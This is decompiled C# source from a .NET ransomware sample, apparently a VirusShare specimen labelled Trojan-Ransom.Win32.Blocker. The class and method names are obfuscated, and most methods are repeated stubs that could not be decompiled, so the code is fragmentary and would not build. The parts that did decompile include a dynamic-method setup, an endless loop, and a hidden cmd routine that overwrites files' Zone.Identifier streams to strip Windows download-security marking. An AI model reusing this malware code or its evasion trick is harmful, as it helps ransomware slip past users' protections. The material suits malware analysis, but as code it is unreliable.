// Decompiled with JetBrains decompiler
// Type: ÆÙÉ豆hJ3ほ
// Assembly: razar, Version=8.7.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74F8CCE7-2D08-483A-8EF7-D222E23C1159
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdfp-0705acad9ada934b73764737b0f6c859e74786b9.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection.Emit;

public class ÆÙÉ豆hJ3ほ
{
  public static object etets() => (object) new DynamicMethod("", typeof (object), new Type[4]
  {
    typeof (byte[]),
    typeof (object[]),
    typeof (string),
    typeof (string)
  });

  public static object rtttr() => (object) "wwhww";

  public static Type pm() => typeof (byte[]);

  public static Type pm2() => typeof (object);

  public static Type pm3() => typeof (string);

  public static void 豆吾弗维吾9786åÒせしわhCsj10ぇくるる()
  {
    while (true)
      ;
  }

  public static void 艾杰伊752ââàãろやろW12ぇめをえ(string path, string name)
  {
    Process process = new Process();
    process.StartInfo = new ProcessStartInfo()
    {
      FileName = "cmd",
      RedirectStandardInput = true,
      RedirectStandardOutput = true,
      UseShellExecute = false,
      CreateNoWindow = true
    };
    process.Start();
    StreamWriter standardInput = process.StandardInput;
    standardInput.WriteLine("cd " + path);
    standardInput.WriteLine("FOR /R %I IN (*" + name + "*) DO > %I:Zone.Identifier ECHO.");
    standardInput.WriteLine("exit");
    standardInput.Close();
  }

  private void ÅÌ艾提uH9ろ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ØÂ西艾IT5な()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÓüÖ哦Vf1も()
  {
    // ISSUE: unable to decompile the method.
  }

  private void çÏ尺艾jr6す()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ãÃ弗杰wp9ひ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void àõ迪弗KC5え()
  {
    // ISSUE: unable to decompile the method.
  }

  private void òÈ艾西XN1つ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ïæ艾ÒkM6う()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÃÖ吉德xX2こ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÀË艾斯Lj8ゆ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÛÁ勒尔mv1ん()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ñÚ杰吾zt7そ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Íì吉艾NG3れ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Ââ娜吉aS8き()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÜÒ艾艾nQ4め()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÚÇ艾艾Bc9ぇ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÌÅ吾尺On3の()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Êø贝艾bz8ら()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÿè吾比ox4ち()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ùû丝ÙCK9ま()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÕÕ克贼PW6け()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ëÊ尔克qi2に()
  {
    // ISSUE: unable to decompile the method.
  }

  private void éÜ维贝Eg7を()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Ùñ贼马Rs1せ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void öä斯开eF6る()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ôÀ维艾rD2か()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÉÓÙ伊FP7み()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÄÆ德ÜSa3ぃ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ßß吾Àgm8さ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void øÔ比艾tk2よ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÈÉÒ艾Hw7う()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÆÙÉ豆hJ3ほ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÅÌ艾提uH9ろ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ØÂ西艾IT5な()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÓüÖ哦Vf1も()
  {
    // ISSUE: unable to decompile the method.
  }

  private void çÏ尺艾jr6す()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ãÃ弗杰wp9ひ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void àõ迪弗KC5え()
  {
    // ISSUE: unable to decompile the method.
  }

  private void òÈ艾西XN1つ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ïæ艾ÒkM6う()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÃÖ吉德xX2こ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÀË艾斯Lj8ゆ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÛÁ勒尔mv1ん()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ñÚ杰吾zt7そ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Íì吉艾NG3れ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Ââ娜吉aS8き()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÜÒ艾艾nQ4め()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÚÇ艾艾Bc9ぇ()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÌÅ吾尺On3の()
  {
    // ISSUE: unable to decompile the method.
  }

  private void Êø贝艾bz8ら()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ÿè吾比ox4ち()
  {
    // ISSUE: unable to decompile the method.
  }

  private void ùû丝ÙCK9ま()
  {
    // ISSUE: unable to decompile the method.
  }

  public class ÈÉÒ艾Hw7う
  {
    public static object Wkxk() => (object) "Get2=18";
  }
}
